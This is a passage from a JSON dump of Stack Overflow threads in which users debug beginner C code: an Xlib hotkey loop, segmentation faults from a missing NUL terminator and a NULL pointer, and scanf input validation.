n);\n</code></pre>\n\n<p>I'm using Visual Studio.</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["c", "linux", "xlib"], "comments": [{"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 1, "creation_date": 1447293579, "post_id": 33661554, "comment_id": 55099797, "body": "Is the loop in your program really <code>while(0)</code>?"}, {"owner": {"reputation": 518, "user_id": 1218232, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/d509b66be4756399ec2b91fbeff65248?s=128&d=identicon&r=PG", "display_name": "Adel Ahmed", "link": "https://stackoverflow.com/users/1218232/adel-ahmed"}, "reply_to_user": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 0, "creation_date": 1447328254, "post_id": 33661554, "comment_id": 55113947, "body": "isn&#39;t it supposted to keep reading events? ad infinitum?"}, {"owner": {"reputation": 518, "user_id": 1218232, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/d509b66be4756399ec2b91fbeff65248?s=128&d=identicon&r=PG", "display_name": "Adel Ahmed", "link": "https://stackoverflow.com/users/1218232/adel-ahmed"}, "reply_to_user": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 0, "creation_date": 1447346402, "post_id": 33661554, "comment_id": 55126248, "body": "I just noticed !!!!!"}], "answers": [{"tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": true, "score": 1, "last_activity_date": 1447346060, "creation_date": 1447346060, "answer_id": 33676559, "question_id": 33661554, "link": "https://stackoverflow.com/questions/33661554/global-hotkeys-using-xlib/33676559#33676559", "title": "global hotkeys using xlib", "body": "<p>You're never calling <code>XNextEvent()</code>, because a <code>while(0)</code> loop never runs. (What you probably meant was <code>while(1)</code>!)</p>\n"}], "owner": {"reputation": 518, "user_id": 1218232, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/d509b66be4756399ec2b91fbeff65248?s=128&d=identicon&r=PG", "display_name": "Adel Ahmed", "link": "https://stackoverflow.com/users/1218232/adel-ahmed"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "accepted_answer_id": 33676559, "answer_count": 1, "score": 0, "last_activity_date": 1447346060, "creation_date": 1447283307, "question_id": 33661554, "link": "https://stackoverflow.com/questions/33661554/global-hotkeys-using-xlib", "title": "global hotkeys using xlib", "body": "<p>I'm trying to get my C application to execute certain tasks when the ctrl+k button is pressed(OR CTRL SHIFT K not sure yet), documentation is a bit sccarce but I was able to find a cpp example and tried to mimic that code:</p>\n\n<pre><code> Display* dpy = XOpenDisplay(0);\n  Window root = DefaultRootWindow(dpy);\n  XEvent ev;\n  unsigned int modifiers = ControlMask | ShiftMask;\n  int keycode = 45;\n  int pointer_mode = GrabModeAsync;\n  int keyboard_mode = GrabModeAsync;\n  XGrabKey(dpy, keycode, modifiers, root, 0, pointer_mode, keyboard_mode);\n  XSelectInput(dpy, root, KeyPressMask);\n  while(0)\n  {\n    XNextEvent(dpy, &amp;ev);\n    if (ev.type == KeyPress)\n      printf(\"key has been pressed\\n\");\n  }\n</code></pre>\n\n<p>I understand the keypresses are captured by the XGrabKey function, the xnext event reads the event and storees that in ev, which I'm comparing the type to the keypress Xevent type, the message does not get printed, I've tried ctrl+k and shift+k and ctrl+shift+k </p>\n"}, {"tags": ["c", "fault"], "comments": [{"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1447282702, "post_id": 33661394, "comment_id": 55096507, "body": "What happens if <code>encode[i]</code> is not in <code>code1</code>? Also look into the <code>strchr</code> function"}, {"owner": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "reply_to_user": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1447282841, "post_id": 33661394, "comment_id": 55096558, "body": "Sorry I have updated the post with the variables."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1447282992, "post_id": 33661394, "comment_id": 55096605, "body": "<code>char encoded[strlen(encode)];</code> needs to be<code>char encoded[strlen(encode) + 1];</code> to accomodate the NUL terminator. If you still get segmentation faults after that then please run your program in a debugger (in fact that should always be the case before turning to help from others)."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447285830, "post_id": 33661394, "comment_id": 55097639, "body": "Your types are wrong. The argument to <code>code</code> should have type <code>char*</code>, not <code>char*[]</code>."}], "answers": [{"comments": [{"owner": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "edited": false, "score": 0, "creation_date": 1447283209, "post_id": 33661484, "comment_id": 55096707, "body": "Thanks for that, I&#39;m still getting the error with that change though."}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "reply_to_user": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "edited": false, "score": 0, "creation_date": 1447283249, "post_id": 33661484, "comment_id": 55096731, "body": "Do you know where exactly the crash is happening? Run the code through a debugger."}, {"owner": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "edited": false, "score": 0, "creation_date": 1447283522, "post_id": 33661484, "comment_id": 55096845, "body": "debugger is pointing to this line: while(encode[i] != code1[j]){"}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "reply_to_user": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "edited": false, "score": 0, "creation_date": 1447287003, "post_id": 33661484, "comment_id": 55097982, "body": "Are you including the check that the character is found in <code>code1</code>?"}], "tags": [], "owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "is_accepted": false, "score": 1, "last_activity_date": 1447282957, "creation_date": 1447282957, "answer_id": 33661484, "question_id": 33661394, "link": "https://stackoverflow.com/questions/33661394/c-while-segmentation-fault/33661484#33661484", "title": "C While Segmentation Fault", "body": "<p>You aren't including the null byte <code>'\\0'</code> in the result string. A c-string ends with the <code>'\\0'</code> character which is not included in the length:</p>\n\n<pre><code>char encoded[strlen(encode)+1];\nstrcpy(encoded, encode);\n</code></pre>\n\n<p>Also you need to check to make sure that every character in <code>encode</code> is also in <code>code1</code>, otherwise you'll access data outside of <code>code</code>. You can add a check for <code>code1[j] == '\\0'</code> and skip that character. You should also look at the <code>strchr</code> function to search for the character instead of doing it yourself.</p>\n"}, {"comments": [{"owner": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "edited": false, "score": 0, "creation_date": 1447284376, "post_id": 33661694, "comment_id": 55097166, "body": "It works when I use code1, but when i try to use a random string i get a segmentation fault still, E.G: char cat[] = &quot;The cat sat&quot;;     Thanks for the help good spot btw"}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1447286929, "post_id": 33661694, "comment_id": 55097956, "body": "What exactly does this solution solve? This still has the same problem as the original code."}, {"owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "edited": false, "score": 0, "creation_date": 1447289148, "post_id": 33661694, "comment_id": 55098581, "body": "This solution solves the original question : segmentation fault. It runs, the original didn&#39;t. Now, there is another problem."}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1447289639, "post_id": 33661694, "comment_id": 55098752, "body": "No it doesn&#39;t: <code>char encoded[strlen( encode )];</code>. See my answer"}], "tags": [], "owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "is_accepted": false, "score": 0, "last_activity_date": 1447285108, "last_edit_date": 1447285108, "creation_date": 1447283967, "answer_id": 33661694, "question_id": 33661394, "link": "https://stackoverflow.com/questions/33661394/c-while-segmentation-fault/33661694#33661694", "title": "C While Segmentation Fault", "body": "<p>This runs but does not work the way you expected. Problem is in encoding decoding and that is another question !</p>\n\n<pre><code>char code1[] = \"abcdefghijklmnopqrstuvwxyz \";\nchar code2[] = \"bpduhijkaltxwmrzfoysvngeqc \";\nchar code3[99]={0};    \n\nvoid code( char *encode[] )\n{\n  char encoded[strlen( encode )];\n  strcpy( encoded, encode );\n  int i = 0;\n  int j = 0;\n  while ( encode[i] != '\\0' )\n  {\n    while ( encoded[i] != code1[j] )  // encoded not encode\n    {\n      j++;\n    }\n    encoded[i] = code2[j];\n    i++;\n    j = 0;\n  }\n  i = 0;\n  printf( \"The word is: %s \\n\", encoded );\n\n}\n\nint main(  )\n{\n  strcpy( code3 , \"once upon a time there was a lost coder\");\n  code( code3 );\n}\n</code></pre>\n"}], "owner": {"reputation": 19, "user_id": 5552588, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153832396110555/picture?type=large", "display_name": "Faris McKay", "link": "https://stackoverflow.com/users/5552588/faris-mckay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1447285108, "creation_date": 1447282520, "last_edit_date": 1447284398, "question_id": 33661394, "link": "https://stackoverflow.com/questions/33661394/c-while-segmentation-fault", "title": "C While Segmentation Fault", "body": "<p>Why does this throw a segmentation fault?</p>\n\n<p>I have debugged my program down to this, which is giving an error? can someone explain why?</p>\n\n<pre><code>char code1[] = \"abcdefghijklmnopqrstuvwxyz \";\nchar code2[] = \"bpduhijkaltxwmrzfoysvngeqc \";\n\nvoid code(char *encode[]){\n    char encoded[strlen(encode)];\n    strcpy (encoded, encode);\n    int i = 0;\n    int j = 0;\n    while (encode[i] != '\\0'){\n        while(encode[i] != code1[j]){\n            j++;\n        }\n    encoded[i] = code2[j];\n    i++;\n    j=0;\n}\ni=0;\nprintf(\"The word is: %s \\n\", encoded);\n</code></pre>\n\n<p>}</p>\n"}, {"tags": ["c", "pointers", "memory", "segmentation-fault"], "comments": [{"owner": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "edited": false, "score": 0, "creation_date": 1447282524, "post_id": 33661383, "comment_id": 55096447, "body": "Try <code>scanf(&quot;%s&quot;, actual.grade)</code> instead"}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1447282570, "post_id": 33661383, "comment_id": 55096464, "body": "You set the value of init to NULL when you called initialize."}, {"owner": {"reputation": 32760, "user_id": 206367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/121b360a4d7d20be6e220dcdb555649f?s=128&d=identicon&r=PG", "display_name": "t0mm13b", "link": "https://stackoverflow.com/users/206367/t0mm13b"}, "edited": false, "score": 0, "creation_date": 1447282728, "post_id": 33661383, "comment_id": 55096516, "body": "Why setting init to null after initialize, returning NULL..."}, {"owner": {"reputation": 32760, "user_id": 206367, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/121b360a4d7d20be6e220dcdb555649f?s=128&d=identicon&r=PG", "display_name": "t0mm13b", "link": "https://stackoverflow.com/users/206367/t0mm13b"}, "edited": false, "score": 0, "creation_date": 1447283114, "post_id": 33661383, "comment_id": 55096659, "body": "There&#39;s another bug in there, using scanf and carriage returns..."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1447283407, "post_id": 33661383, "comment_id": 55096793, "body": "Try using for() loops, instead of while(). It simplifies life!"}], "answers": [{"comments": [{"owner": {"reputation": 449, "user_id": 1985937, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/tSzRq.jpg?s=128&g=1", "display_name": "Laura Martins", "link": "https://stackoverflow.com/users/1985937/laura-martins"}, "edited": false, "score": 1, "creation_date": 1447283224, "post_id": 33661418, "comment_id": 55096716, "body": "Thank you! I saw that you should initialize your structure as null on a tutorial, I guess I did it on the wrong order.. Noobs right? haha   I&#39;m sorry about the dumb question, you guys are the best!"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1447289408, "post_id": 33661418, "comment_id": 55098678, "body": "You should be aware that many &#39;tutorials&#39; are full of crap.  Nulling a pointer/whatever just before loading it with another, valid value is pointless, (pointerless?), at best, and easy to get wrong at worst.  Same with the cargo-cult &#39;bzero/memset&#39; of I/O buffers."}], "tags": [], "owner": {"reputation": 20231, "user_id": 1342730, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/36543a7316596ec6e930bc8c996bf14b?s=128&d=identicon&r=PG", "display_name": "mathematician1975", "link": "https://stackoverflow.com/users/1342730/mathematician1975"}, "is_accepted": false, "score": 2, "last_activity_date": 1447283235, "last_edit_date": 1447283235, "creation_date": 1447282620, "answer_id": 33661418, "question_id": 33661383, "link": "https://stackoverflow.com/questions/33661383/pointer-segmentation-fault-at-scanf/33661418#33661418", "title": "pointer segmentation fault at scanf", "body": "<p>First you allocate memory for <code>init</code></p>\n\n<pre><code>init = (student*)malloc(sizeof(student)); \n</code></pre>\n\n<p>but you immediately set <code>init</code> to NULL with the return value of your <code>initialize()</code> function here</p>\n\n<pre><code>init = initialize();\n</code></pre>\n\n<p>Not only is this a memory leak, but you next set <code>actual</code> to NULL here</p>\n\n<pre><code>actual = init; \n</code></pre>\n\n<p>Then later in your while loop you dereference <code>actual</code> (which is NULL) in several places such as here</p>\n\n<pre><code>scanf(\"%d\", &amp;actual-&gt;grade); \n</code></pre>\n\n<p>Dereferencing NULL pointers is undefined behaviour and this is a likely source of your error.</p>\n"}, {"tags": [], "owner": {"reputation": 19923, "user_id": 66519, "user_type": "registered", "accept_rate": 99, "profile_image": "https://www.gravatar.com/avatar/83ea6683f15edb2087f6a3ad4f42605b?s=128&d=identicon&r=PG", "display_name": "ojblass", "link": "https://stackoverflow.com/users/66519/ojblass"}, "is_accepted": false, "score": 0, "last_activity_date": 1447282915, "creation_date": 1447282915, "answer_id": 33661478, "question_id": 33661383, "link": "https://stackoverflow.com/questions/33661383/pointer-segmentation-fault-at-scanf/33661478#33661478", "title": "pointer segmentation fault at scanf", "body": "<p>Your initialize() function is returning null and you are creating a memory leak.  Instead of returning null initialize the data members to reasonable values.</p>\n"}, {"tags": [], "owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "is_accepted": false, "score": 0, "last_activity_date": 1447284363, "creation_date": 1447284363, "answer_id": 33661769, "question_id": 33661383, "link": "https://stackoverflow.com/questions/33661383/pointer-segmentation-fault-at-scanf/33661769#33661769", "title": "pointer segmentation fault at scanf", "body": "<p>\"Thank you! I saw that you should initialize your structure as null on a tutorial, I guess I did it on the wrong order.. Noobs right? haha I'm sorry about the dumb question, you guys are the best\"</p>\n\n<p>you are correct, you should initialize to null. But the code you have doesnt do that.</p>\n\n<p>You need to do this</p>\n\n<pre><code>student *initialize(student * st)\n{\n   st-&gt;id = 0;\n   st-&gt;grade = 0;\n   st-&gt;next = NULL;\n   return st;\n}\n</code></pre>\n\n<p>or use calloc instead of malloc to make a student object (calloc clears the memry to 0)</p>\n\n<p>or do</p>\n\n<pre><code>init = malloc ...\nmemset(init, 0, sizeof(student));\n</code></pre>\n"}], "owner": {"reputation": 449, "user_id": 1985937, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/tSzRq.jpg?s=128&g=1", "display_name": "Laura Martins", "link": "https://stackoverflow.com/users/1985937/laura-martins"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 471, "favorite_count": 0, "closed_date": 1594766120, "answer_count": 3, "score": 0, "last_activity_date": 1447284363, "creation_date": 1447282431, "last_edit_date": 1447282717, "question_id": 33661383, "link": "https://stackoverflow.com/questions/33661383/pointer-segmentation-fault-at-scanf", "closed_reason": "Duplicate", "title": "pointer segmentation fault at scanf", "body": "<p>a Little help?\nI'm pretty sure the answer must be something silly, but I cannot see why am I getting a segmentation fault right after my scanf. I've been staring at my piece of code for a long time now: </p>\n\n<pre><code>#include&lt;stdio.h&gt; \n#include&lt;stdlib.h&gt; \n#include&lt;string.h&gt; \n\ntypedef struct Student{ \n\n    int grade, id; \n    struct Student *next; \n}student; \n\n\nstudent *initialize(){\n    return NULL;\n}\n\nint main(){ \n    student *init; \n    student *nxt; \n    student *actual;\n    int resp;\n\n    init = (student*)malloc(sizeof(student)); \n    init = initialize();\n\n    actual = init; \n\n    while(1){ \n        printf(\"type grade:\\n\"); \n        scanf(\"%d\", &amp;actual-&gt;grade); \n        printf(\"type id:\\n\"); \n        scanf(\"%d\", &amp;actual-&gt;id); \n        printf(\"wanna continue? (1-YES e &lt;other&gt;-NO)\\n\"); \n        if(resp==1){ \n            actual-&gt;next=(student*)malloc(sizeof(student)); \n            nxt=actual-&gt;next; \n        }else \n            break; \n    }\n\n    actual-&gt;next=NULL;\n    return 0; \n}\n</code></pre>\n\n<p>No big deal, right? There is a struct, I want to scan a value into it. on my terminal, I get:</p>\n\n<pre><code>type grade:\n3\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>any ideas?</p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447279847, "post_id": 33660753, "comment_id": 55095132, "body": "what doesn&#39;t work? There is a missing comma between  <code>&amp;sign</code>  and <code>&amp;number</code>. You better show the actual code."}, {"owner": {"reputation": 10381, "user_id": 3011009, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XVtZq.jpg?s=128&g=1", "display_name": "mcleod_ideafix", "link": "https://stackoverflow.com/users/3011009/mcleod-ideafix"}, "edited": false, "score": 0, "creation_date": 1447279875, "post_id": 33660753, "comment_id": 55095146, "body": "&quot;a&quot; is not a number nor it fits your pattern (sign number) so no surprise it prints &quot;Fail!&quot;"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1447280866, "post_id": 33660753, "comment_id": 55095651, "body": "You <i>want</i> to use <code>scanf</code> or you <i>need</i> to use <code>scanf</code> for an assignment.  If you are required to use <code>scanf</code>, chux solution is very good.  Otherwise, if you want to implement precise semantics, <code>scanf</code> is not recommended, you should read the input with <code>fgets</code> and parse it in C."}, {"owner": {"reputation": 51, "user_id": 5552410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f393ce15d9211a51c1cfff85e0fe55d4?s=128&d=identicon&r=PG&f=1", "display_name": "jinx", "link": "https://stackoverflow.com/users/5552410/jinx"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1447281382, "post_id": 33660753, "comment_id": 55095920, "body": "@chqrlie Thanks I want to use scanf and I will take a look at fgets in manual."}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 5552410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f393ce15d9211a51c1cfff85e0fe55d4?s=128&d=identicon&r=PG&f=1", "display_name": "jinx", "link": "https://stackoverflow.com/users/5552410/jinx"}, "edited": false, "score": 0, "creation_date": 1447280181, "post_id": 33660822, "comment_id": 55095309, "body": "Thanks, I forgot the comma when a was writing this post. But your code works only for &quot;+ 10&quot;, for &quot;a&quot; the program waiting for another input."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 51, "user_id": 5552410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f393ce15d9211a51c1cfff85e0fe55d4?s=128&d=identicon&r=PG&f=1", "display_name": "jinx", "link": "https://stackoverflow.com/users/5552410/jinx"}, "edited": false, "score": 0, "creation_date": 1447280437, "post_id": 33660822, "comment_id": 55095444, "body": "Sorry, I just pointed the easy mistakes.  If you want to validate the input, read the line with <code>fgets</code> and parse it with <code>sscanf</code> or write the simple logic in C, <code>scanf</code> and friends are cumbersome, error prone and inefficient."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 0, "last_activity_date": 1447279876, "creation_date": 1447279876, "answer_id": 33660822, "question_id": 33660753, "link": "https://stackoverflow.com/questions/33660753/scanf-only-sign-and-number/33660822#33660822", "title": "scanf() only sign and number", "body": "<p>You seem to have forgotten a comma here:</p>\n\n<pre><code>scanf(\" %c %d\", &amp;sign &amp;number)\n</code></pre>\n\n<p>Also the space is both redundant and erroneous.\nIt should be</p>\n\n<pre><code>scanf(\" %c%d\", &amp;sign, &amp;number)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6675, "user_id": 854742, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3dc3befe29d589c7c34fd1600affc041?s=128&d=identicon&r=PG", "display_name": "Carey Gregory", "link": "https://stackoverflow.com/users/854742/carey-gregory"}, "edited": false, "score": 0, "creation_date": 1447280151, "post_id": 33660837, "comment_id": 55095292, "body": "I believe the OP doesn&#39;t want to require a space between the sign and number."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "reply_to_user": {"reputation": 6675, "user_id": 854742, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3dc3befe29d589c7c34fd1600affc041?s=128&d=identicon&r=PG", "display_name": "Carey Gregory", "link": "https://stackoverflow.com/users/854742/carey-gregory"}, "edited": false, "score": 2, "creation_date": 1447280326, "post_id": 33660837, "comment_id": 55095387, "body": "@CareyGregory The examples in the question are how it <i>should</i> work, e.g. &quot;+10&quot; <i>should</i> fail."}, {"owner": {"reputation": 51, "user_id": 5552410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f393ce15d9211a51c1cfff85e0fe55d4?s=128&d=identicon&r=PG&f=1", "display_name": "jinx", "link": "https://stackoverflow.com/users/5552410/jinx"}, "edited": false, "score": 0, "creation_date": 1447280672, "post_id": 33660837, "comment_id": 55095551, "body": "Thank you, now it works perfect. I&#39;ll test it one more time, but it looks good. Thank you very very much."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1447280688, "post_id": 33660837, "comment_id": 55095562, "body": "<code>scanf</code> cannot do the job reliably:  You very shrewd proposal will fail to fail on <code>+ +10</code>,  <code>+ -10</code>, <code>- +10</code>, <code>- -10</code>... not to mention extra spaces: should they be ignored or rejected?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1447280915, "post_id": 33660837, "comment_id": 55095674, "body": "@chqrlie True.  OP&#39;s examples and direction left a lot of interpretation.  I&#39;ll post a more pedantic one too."}, {"owner": {"reputation": 51, "user_id": 5552410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f393ce15d9211a51c1cfff85e0fe55d4?s=128&d=identicon&r=PG&f=1", "display_name": "jinx", "link": "https://stackoverflow.com/users/5552410/jinx"}, "edited": false, "score": 1, "creation_date": 1447280997, "post_id": 33660837, "comment_id": 55095719, "body": "<code>+ +10</code> is OK and for <code>+ -10</code> I will add <code>|| number&lt;0</code> to the if() construction. Extra spaces should be ignored, I just want have at least one space between + and 10."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 5, "last_activity_date": 1447281951, 